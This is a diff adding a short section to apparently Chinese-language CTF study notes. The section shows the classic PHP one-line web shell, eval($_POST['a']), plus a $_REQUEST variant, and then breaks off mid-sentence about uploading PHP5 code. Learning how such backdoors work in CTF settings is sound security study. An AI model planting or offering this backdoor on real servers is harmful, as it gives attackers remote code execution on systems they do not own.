@@ -106,6 +106,25 @@ $a = str_replace(':1:', ':2:', $a);
 
 
 
+## 一句话木马
+
+通常PHP的一句话代码是这样的
+
+```php
+<?php
+
+//One Word Backdoor
+eval($_POST['a']);
+//或者这种，可以支持GET/POST请求
+//eval($_REQUEST['a'];
+
+?>
+```
+
+在有的题目中，需要上传 PHP5 格式的代码，
+
+
+
 ## 参考资料
 
 1. [CTF include](https://blog.csdn.net/qq_61774705/article/details/126323696)
